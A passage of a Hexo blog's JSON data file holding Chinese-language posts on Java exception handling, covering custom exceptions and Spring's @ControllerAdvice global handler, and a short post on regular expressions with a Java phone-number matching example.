的全局异常拦截处理.<br></p>\n<p>例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 全局异常处理类，拦截@RequestMapping抛出的异常</span><br><span class=\"line\"> * 处理顺序为配置顺序 依次向下</span><br><span class=\"line\"> * @author xxl</span><br><span class=\"line\"> */</span><br><span class=\"line\">@ControllerAdvice</span><br><span class=\"line\">class GlobalExceptionHandler &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     *  拦截BindException类的异常 @Valid注解触发</span><br><span class=\"line\">     *  @NotBlank参数非空校验失败的异常</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(BindException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(BindException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.PARAMS_VALID_EXCEPTION,&quot;参数非空校验异常&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     *  拦截MyDatabaseException类的异常</span><br><span class=\"line\">     *  数据库操作异常</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(MyDatabaseException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(MyDatabaseException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     *  拦截MyFileException类的异常</span><br><span class=\"line\">     *  文件操作异常</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(MyFileException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(MyFileException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 拦截MyParamsExxception</span><br><span class=\"line\">     * 参数异常</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(MyParamsException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(MyParamsException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 文件上传错误</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(MultipartException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(MultipartException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.SERVER_EXCEPTION,&quot;文件上传异常&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 空指针异常拦截</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(NullPointerException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(NullPointerException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return ResultMessage.error(StatusCode.SERVER_EXCEPTION, &quot;空指针异常&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 其它异常,最后拦截，所有没匹配到得异常</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(Exception.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(Exception e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.SERVER_EXCEPTION,&quot;发生异常--&quot; + e.getMessage());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"一-异常\"><a href=\"#一-异常\" class=\"headerlink\" title=\"一.异常\"></a>一.异常</h1><p>盗图：<a href=\"https://marchnineteen.github.io/2018/08/08/java/javase/exception/\" target=\"_blank\" rel=\"noopener\">https://marchnineteen.github.io/2018/08/08/java/javase/exception/</a><br><img src=\"http://67.216.218.49:8000/file/blogs/java/base/exception/异常结构体系.png\" alt=\"io\"></p>\n<p>异常的体系结构为：</p>\n<ul>\n<li><p>Throwable</p>\n<p>所有异常的基类， 分为 Error 和 Exception</p>\n</li>\n<li><p>Error</p>\n<p>错误，一般会导致Jvm出错。</p>\n</li>\n<li><p>Exception</p>\n<p>分为 运行时异常(RuntimeException) 和 非运行时异常.<br><br>也叫 未检查的异常  和  检查的异常</p>\n</li>\n</ul>\n<p>Java compiler要求所有的Exception 要么被catch,要么被throw，除非这是一个RuntimeExeption (e instanceof RuntimeException)。也就是说，通常的Exception一定要被处理，也即我们所说的 checked exception，而RuntimeException不强制要求处理，（当然你自己要处理也可以），所以我们称为unchecked exception</p>\n<h1 id=\"二-自定义异常\"><a href=\"#二-自定义异常\" class=\"headerlink\" title=\"二.自定义异常\"></a>二.自定义异常</h1><h2 id=\"1-例子\"><a href=\"#1-例子\" class=\"headerlink\" title=\"1.例子\"></a>1.例子</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 标记文件处理流程中得错误</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class MyFileException extends RuntimeException &#123;</span><br><span class=\"line\">    private String errMsg;</span><br><span class=\"line\">    private Throwable throwable;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public MyFileException() &#123;</span><br><span class=\"line\">        this(&quot;文件相关操作发生异常&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    public MyFileException(String errMsg) &#123;</span><br><span class=\"line\">        this.errMsg = errMsg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public MyFileException(Throwable throwable) &#123;</span><br><span class=\"line\">        this.throwable = throwable;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    public MyFileException(Throwable throwable, String msg) &#123;</span><br><span class=\"line\">        this.throwable = throwable;</span><br><span class=\"line\">        this.errMsg = msg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String getErrMsg() &#123;</span><br><span class=\"line\">        if(this.errMsg == null || this.errMsg.equals(&quot;&quot;))&#123;</span><br><span class=\"line\">            return this.throwable.getMessage();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if(this.throwable == null)&#123;</span><br><span class=\"line\">            return this.errMsg;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return this.throwable.getMessage() + &quot; -- &quot; + this.errMsg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-继承选择\"><a href=\"#2-继承选择\" class=\"headerlink\" title=\"2.继承选择\"></a>2.继承选择</h2><p>通常我们的自定义异常都继承于 Exception 或 RuntimeException.<br></p>\n<p>两者的区别是:<br></p>\n<p> 继承于 Exception 的  需要我们对异常进行处理，否则编译会不通过。利用这一点，可以强制的告诉别人，这里会发生一个异常，你必须注意到，并对它进行处理.<br></p>\n<p> 继承于 RuntimeException 的， 为 unchecked Exception, 不要求强制处理(throw 时 不需要在方法上 throws)。实际上，这种类型的异常，通常应该交给上级(调用你的程序来进行处理).<br></p>\n<p>选择使用那种方式，完全按照我们的需求与业务逻辑来.<br></p>\n<h1 id=\"三-Spring-全局异常\"><a href=\"#三-Spring-全局异常\" class=\"headerlink\" title=\"三.Spring 全局异常\"></a>三.Spring 全局异常</h1><h2 id=\"1-ExceptionHandler\"><a href=\"#1-ExceptionHandler\" class=\"headerlink\" title=\"1.@ExceptionHandler\"></a>1.@ExceptionHandler</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Target(&#123;ElementType.METHOD&#125;)</span><br><span class=\"line\">@Retention(RetentionPolicy.RUNTIME)</span><br><span class=\"line\">@Documented</span><br><span class=\"line\">public @interface ExceptionHandler &#123;</span><br><span class=\"line\">    Class&lt;? extends Throwable&gt;[] value() default &#123;&#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>作用域为 method<br></p>\n<p>如果@ExceptionHandler方法是在 @Controller 内部定义的，那么它会接收并处理由 当前 Controller（或其任何子类）中的@RequestMapping方法抛出的异常。如果你将 @ExceptionHandler 方法定义在 @ControllerAdvice 类中，那么它会处理相关控制器中抛出的异常.<br><br>此外,@ExceptionHandler注解还可以接受一个异常类型的数组作为参数值。若抛出了已在列表中声明的异常，那么相应的@ExceptionHandler方法将会被调用。如果没有给注解任何参数值，那么默认处理的异常类型将是方法参数所声明的那些异常。</p>\n<h2 id=\"2-ControllerAdvice\"><a href=\"#2-ControllerAdvice\" class=\"headerlink\" title=\"2.@ControllerAdvice\"></a>2.@ControllerAdvice</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class=\"line\">@Retention(RetentionPolicy.RUNTIME)</span><br><span class=\"line\">@Documented</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public @interface ControllerAdvice &#123;</span><br><span class=\"line\">    @AliasFor(&quot;basePackages&quot;)</span><br><span class=\"line\">    String[] value() default &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    @AliasFor(&quot;value&quot;)</span><br><span class=\"line\">    String[] basePackages() default &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    Class&lt;?&gt;[] basePackageClasses() default &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    Class&lt;?&gt;[] assignableTypes() default &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    Class&lt;? extends Annotation&gt;[] annotations() default &#123;&#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>作用域为 type,包括类、接口和枚举等<br></p>\n<p>通过 @ControllerAdvice 注解可以将对于控制器(@Controller)的全局配置放在同一个位置<br></p>\n<p>注意：  @ControllerAdvice 只能捕捉到Controller层(异常会向上传递，抛到调用层)抛出的异常</p>\n<h2 id=\"3-全局异常\"><a href=\"#3-全局异常\" class=\"headerlink\" title=\"3.全局异常\"></a>3.全局异常</h2><p>由1，2已知，@ExceptionHandler 异常拦截只拦截当前 Controller 里的 @RequestMapping方法抛出的异常, 同时 @ControllerAdvice 可以提供对 Controller 的全局配置。 所以，将这两个注解结合，可以提供对 Controller 的全局异常拦截处理.<br></p>\n<p>例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/**</span><br><span class=\"line\"> * 全局异常处理类，拦截@RequestMapping抛出的异常</span><br><span class=\"line\"> * 处理顺序为配置顺序 依次向下</span><br><span class=\"line\"> * @author xxl</span><br><span class=\"line\"> */</span><br><span class=\"line\">@ControllerAdvice</span><br><span class=\"line\">class GlobalExceptionHandler &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     *  拦截BindException类的异常 @Valid注解触发</span><br><span class=\"line\">     *  @NotBlank参数非空校验失败的异常</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(BindException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(BindException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.PARAMS_VALID_EXCEPTION,&quot;参数非空校验异常&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     *  拦截MyDatabaseException类的异常</span><br><span class=\"line\">     *  数据库操作异常</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(MyDatabaseException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(MyDatabaseException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     *  拦截MyFileException类的异常</span><br><span class=\"line\">     *  文件操作异常</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(MyFileException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(MyFileException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 拦截MyParamsExxception</span><br><span class=\"line\">     * 参数异常</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(MyParamsException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(MyParamsException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.EXCEPTION_DATABASE,e.getErrMsg());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 文件上传错误</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(MultipartException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(MultipartException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.SERVER_EXCEPTION,&quot;文件上传异常&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 空指针异常拦截</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(NullPointerException.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(NullPointerException e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return ResultMessage.error(StatusCode.SERVER_EXCEPTION, &quot;空指针异常&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * 其它异常,最后拦截，所有没匹配到得异常</span><br><span class=\"line\">     * @param e</span><br><span class=\"line\">     * @return</span><br><span class=\"line\">     */</span><br><span class=\"line\">    @ExceptionHandler(Exception.class)</span><br><span class=\"line\">    @ResponseBody</span><br><span class=\"line\">    public ResultMessage exceptionHandler(Exception e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        return  ResultMessage.error(StatusCode.SERVER_EXCEPTION,&quot;发生异常--&quot; + e.getMessage());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"正则","date":"2018-10-10T15:28:40.000Z","_content":"\n#### 1.正则表达式\n正则表达式一般用来匹配字符串，进行相应处理。\n\n#### 2.常用符号\n- (exp)  子串\n- {n} {n,} {n,m} 限定匹配次数。分别为:匹配n次;至少n次;至少n次，至多m次。\n- \\* + ? 限定次数。分别为:0或多次;1或多次;0或1次\n- | 或 &nbsp;&nbsp;[a|b]匹配a或b\n- ^ java中为非，一般为匹配开始位置\n- $ 匹配结尾位置\n- \\\\b 匹配边界，即字与空格间的位置\n- 数字 [0-9]或\\\\d &nbsp;&nbsp;非数字 [^0-9]或\\\\D\n- 字母 [a-z] &nbsp;&nbsp;非字母 [^a-z]\n- 任何字符 [A-Za-z0-9]或\\\\w  &nbsp;&nbsp;非字符 [^A-Za-z0-9]或\\\\W\n\n#### 3.例子\n1. 例一\n\n    匹配两个或三个十一位的电话号码，中间用逗号分割(java)\n    ```\n    String zz1 = \"(\\\\d{11},){1,3}\\\\d{11}\";\n    String str1 = \"17888824094,17888824094,17888824094\";\n    boolean isTrue1 = Pattern.matches(zz1, str1);\n    ```\n","source":"_posts/java/正则.md","raw":"---\ntitle: 正则\ndate: 2018-10-10 11:28:40\ntags: [java]\n---\n\n#### 1.正则表达式\n正则表达式一般用来匹配字符串，进行相应处理。\n\n#### 2.常用符号\n- (exp)  子串\n- {n} {n,} {n,m} 限定匹配次数。分别为:匹配n次;至少n次;至少n次，至多m次。\n- \\* + ? 限定次数。分别为:0或多次;1或多次;0或1次\n- | 或 &nbsp;&nbsp;[a|b]匹配a或b\n- ^ java中为非，一般为匹配开始位置\n- $ 匹配结尾位置\n- \\\\b 匹配边界，即字与空格间的位置\n- 数字 [0-9]或\\\\d &nbsp;&nbsp;非数字 [^0-9]或\\\\D\n- 字母 [a-z] &nbsp;&nbsp;非字母 [^a-z]\n- 任何字符 [A-Za-z0-9]或\\\\w  &nbsp;&nbsp;非字符 [^A-Za-z0-9]或\\\\W\n\n#### 3.例子\n1. 例一\n\n    匹配两个或三个十一位的电话号码，中间用逗号分割(java)\n    ```\n    String zz1 = \"(\\\\d{11},){1,3}\\\\d{11}\";\n    String str1 = \"17888824094,17888824094,17888824094\";\n    boolean isTrue1 = Pattern.matches(zz1, str1);\n    ```\n","slug":"java/正则","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321i9001o6dcplcn2masc","content":"<h4 id=\"1-正则表达式\"><a href=\"#1-正则表达式\" class=\"headerlink\" title=\"1.正则表达式\"></a>1.正则表达式</h4><p>正则表达式一般用来匹配字符串，进行相应处理。</p>\n<h4 id=\"2-常用符号\"><a href=\"#2-常用符号\" class=\"headerlink\" title=\"2.常用符号\"></a>2.常用符号</h4><ul>\n<li>(exp)  子串</li>\n<li>{n} {n,} {n,m} 限定匹配次数。分别为:匹配n次;至少n次;至少n次，至多m次。</li>\n<li>* + ? 限定次数。分别为:0或多次;1或多次;0或1次</li>\n<li>| 或 &nbsp;&nbsp;[a|b]匹配a或b</li>\n<li>^ java中为非，一般为匹配开始位置</li>\n<li>$ 匹配结尾位置</li>\n<li>\\b 匹配边界，即字与空格间的位置</li>\n<li>数字 [0-9]或\\d &nbsp;&nbsp;非数字 [^0-9]或\\D</li>\n<li>字母 [a-z] &nbsp;&nbsp;非字母 [^a-z]</li>\n<li>任何字符 [A-Za-z0-9]或\\w  &nbsp;&nbsp;非字符 [^A-Za-z0-9]或\\W</li>\n</ul>\n<h4 id=\"3-例子\"><a href=\"#3-例子\" class=\"headerlink\" title=\"3.例子\"></a>3.例子</h4><ol>\n<li><p>例一</p>\n<p> 匹配两个或三个十一位的电话号码，中间用逗号分割(java)</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">String zz1 = &quot;(\\\\d&#123;11&#125;,)&#123;1,3&#125;\\\\d&#123;11&#125;&quot;;</span><br><span class=\"line\">String str1 = &quot;17888824094,17888824094,17888824094&quot;;</span><br><span class=\"line\">boolean isTrue1 = Pattern.matches(zz1, str1);</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-正则表达式\"><a href=\"#1-正则表达式\" class=\"headerlink\" title=\"1.正则表达式\"></a>1.正则表达式</h4><p>正则表达式一般用来匹配字符串，进行相应处理。</p>\n<h4 id=\"2-常用符号\"><a href=\"#2-常用符号\" class=\"headerlink\" title=\"2.常用符号\"></a>2.常用符号</h4><ul>\n<li>(exp)  子串</li>\n<li>{n} {n,} {n,m} 限定匹配次数。分别为:匹配n次;至少n次;至少n次，至多m次。</li>\n<li>* + ? 限定次数。分别为:0或多次;1或多次;0或1次</li>\n<li>| 或 &nbsp;&nbsp;[a|b]匹配a或b</li>\n<li>^ java中为非，一般为匹配开始位置</li>\n<li>$ 匹配结尾位置</li>\n<li>\\b 匹配边界，即字与空格间的位置</li>\n<li>数字 [0-9]或\\d &nbsp;&nbsp;非数字 [^0-9]或\\D</li>\n<li>字母 [a-z] &nbsp;&nbsp;非字母 [^a-z]</li>\n<li>任何字符 [A-Za-z0-9]或\\w  &nbsp;&nbsp;非字符 [^A-Za-z0-9]或\\W</li>\n</ul>\n<h4 id=\"3-例子\"><a href=\"#3-例子\" class=\"headerlink\" title=\"3.例子\"></a>3.例子</h4><ol>\n<li><p>例一</p>\n<p> 匹配两个或三个十一位的电话号码，中间用逗号分割(java)</p>\n <figure class=\"highlight plain\"><table><tr><td 